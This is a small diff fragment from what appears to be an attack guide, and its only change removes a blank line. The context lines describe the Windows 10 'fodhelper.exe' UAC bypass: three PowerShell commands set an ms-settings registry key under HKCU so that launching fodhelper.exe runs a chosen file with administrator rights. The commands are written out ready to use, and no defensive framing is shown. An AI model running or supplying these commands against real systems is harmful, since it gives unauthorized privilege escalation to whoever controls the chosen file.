@@ -17,7 +17,6 @@ in connection with which it inherits administrator rights and is able to execute
 
 Windows 10
 We use the vulnerability of the process from the white list "fodhelper.exe"
-
 powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "path to our file" -Force
 powershell New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 powershell Start-Process "fodhelper.exe"
